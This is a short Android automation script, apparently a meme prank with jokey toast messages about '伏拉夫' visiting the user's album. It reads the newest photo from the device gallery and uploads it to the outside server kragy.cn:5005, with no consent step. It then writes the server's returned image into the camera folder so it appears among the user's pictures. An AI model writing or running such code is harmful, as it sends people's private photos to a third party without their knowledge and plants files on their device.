

function findLatestPhoto() {
    var latestPhoto = null;

    // 获取最新的照片
    var cursor = context.getContentResolver().query(
        android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
        [android.provider.MediaStore.Images.ImageColumns.DATA, android.provider.MediaStore.Images.ImageColumns.DATE_ADDED],
        null,
        null,
        android.provider.MediaStore.Images.ImageColumns.DATE_ADDED + " DESC"
    );

    if (cursor != null && cursor.moveToFirst()) {
        var imagePath = cursor.getString(cursor.getColumnIndex(android.provider.MediaStore.Images.ImageColumns.DATA));
        var imageDate = cursor.getLong(cursor.getColumnIndex(android.provider.MediaStore.Images.ImageColumns.DATE_ADDED));

        latestPhoto = imagePath;
    }

    if (cursor != null) {
        cursor.close();
    }

    return latestPhoto;
}

device.vibrate(15)
toast("伏拉夫访问了你的相册👀")
var data = open(findLatestPhoto());
log(data)
var res = http.postMultipart(
    'http://kragy.cn:5005',
    {
        'file111': data
    }
);

var savePath = '/sdcard/DCIM/camera/IMG' + new java.text.SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date()) + '.png'; // 可以根据需要修改文件名和路径

// 将二进制数据保存为图片文件
files.writeBytes(savePath, res.body.bytes())
media.scanFile(savePath)

device.vibrate(15)
toastLog("伏拉夫点赞了你的最新照片👍")